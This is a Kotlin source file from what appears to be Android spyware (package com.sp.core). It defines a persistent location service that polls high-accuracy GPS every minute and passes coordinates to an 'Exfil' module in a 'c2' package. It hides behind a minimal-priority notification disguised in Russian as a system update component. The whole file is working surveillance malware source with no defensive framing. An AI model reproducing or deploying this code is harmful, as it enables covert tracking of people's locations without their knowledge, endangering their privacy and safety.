package com.sp.core.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.sp.core.c2.Exfil

class LocationService : Service() {

    private lateinit var client: FusedLocationProviderClient
    private lateinit var callback: LocationCallback

    override fun onCreate() {
        super.onCreate()
        startForeground(NOTIF_ID, buildNotification())
        client = LocationServices.getFusedLocationProviderClient(this)

        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 60_000L)
            .setMinUpdateDistanceMeters(10f)
            .setWaitForAccurateLocation(false)
            .build()

        callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { push(it) }
            }
        }
        try {
            client.requestLocationUpdates(request, callback, Looper.getMainLooper())
        } catch (_: SecurityException) {}
    }

    private fun push(loc: Location) {
        val payload = """{"lat":${loc.latitude},"lon":${loc.longitude},"acc":${loc.accuracy},"ts":${loc.time},"provider":"${loc.provider}"}"""
        Exfil.sendLog(this, "location", payload)
    }

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    companion object { const val NOTIF_ID = 0x5F5F }
}